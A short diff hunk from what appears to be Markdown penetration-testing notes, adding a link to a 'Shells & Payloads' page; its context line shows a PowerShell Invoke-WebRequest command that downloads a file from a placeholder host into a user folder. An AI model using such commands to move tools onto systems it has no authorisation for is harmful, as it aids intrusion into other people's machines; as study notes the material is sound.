@@ -1005,3 +1005,5 @@ Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "C:\Users\Pu
 </details>
 
 ---
+
+📘 **Next step:** Continue with [SHELLS & PAYLOADS](./05-shells-payloads.md)
